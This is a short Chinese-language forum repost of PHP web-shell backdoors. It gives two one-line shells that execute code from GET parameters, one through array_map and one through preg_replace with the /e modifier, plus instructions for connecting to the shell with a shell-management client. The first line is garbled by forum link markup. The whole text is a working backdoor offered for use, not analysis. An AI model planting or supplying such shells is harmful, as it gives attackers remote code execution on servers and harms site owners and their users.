转载自:https://forum.90sec.org/forum.php?mod=viewthread&tid=7316

源码<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>

<?
@preg_replace("/f/e",$_GET['u'],"fengjiao"); 
?>

连接方法->
.php?u=一句话，然后菜马连一句话密码！把<o>配上去

